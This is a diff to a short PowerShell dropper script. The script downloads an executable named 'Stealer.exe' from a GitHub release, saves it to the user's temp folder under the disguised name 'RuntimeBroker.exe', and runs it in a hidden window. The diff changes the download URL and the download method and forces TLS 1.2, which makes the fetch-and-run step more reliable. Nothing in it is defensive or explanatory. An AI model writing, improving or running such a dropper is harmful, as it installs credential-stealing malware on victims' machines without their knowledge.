@@ -1,4 +1,5 @@
-$url = 'https://github.com/zeykop9-tech/Stealer.exe'
+$url = 'https://github.com/zeykop9-tech/Executers-hub/releases/download/V1/Stealer.exe'
 $out = $env:TEMP + '\RuntimeBroker.exe'
-(New-Object Net.WebClient).DownloadFile($url, $out)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 60
 Start-Process $out -WindowStyle Hidden
